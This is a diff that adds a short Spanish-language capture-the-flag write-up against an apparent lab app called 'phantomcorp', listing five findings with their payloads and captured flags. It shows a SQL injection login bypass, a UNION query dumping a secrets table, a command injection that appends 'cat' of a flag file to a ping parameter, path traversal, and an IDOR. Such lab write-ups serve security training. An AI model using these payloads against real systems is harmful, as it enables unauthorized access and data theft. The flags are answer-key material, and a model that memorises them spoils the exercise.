@@ -1,0 +1,30 @@
+### R1 — SQLi bypass de autenticacion (POST /login)
+$ curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin' -- " --data-urlencode "pass=x"
+Bienvenido admin (rol: admin).
+Panel de administracion desbloqueado: FLAG{sqli_auth_bypass}
+
+
+### R2 — SQLi UNION (GET /buscar)
+# esquema via sqlite_master:
+Resultados:
+  productos - $CREATE TABLE productos(nombre TEXT, precio TEXT)
+  secrets - $CREATE TABLE secrets(clave TEXT, valor TEXT)
+  users - $CREATE TABLE users(id INTEGER, user TEXT, pass TEXT, rol TEXT, nota_privada TEXT)
+$ q=zzz' UNION SELECT clave, valor FROM secrets -- 
+Resultados:
+  flag_union - $FLAG{sqli_union_dump}
+
+### R3 — Command injection (GET /herramientas/ping)
+$ host=127.0.0.1; cat /app/flags/cmdi.txt
+$ ping -c1 127.0.0.1; cat /app/flags/cmdi.txt
+FLAG{command_injection_rce}
+
+
+### R4 — Path traversal (GET /descargar)
+$ archivo=../flags/lfi.txt
+FLAG{path_traversal_lfi}
+
+
+### R5 — IDOR (GET /perfil)
+$ id=1  (mi perfil es id=3)
+{"id": 1, "user": "admin", "rol": "admin", "nota_privada": "Nota del admin: FLAG{idor_broken_access}"}
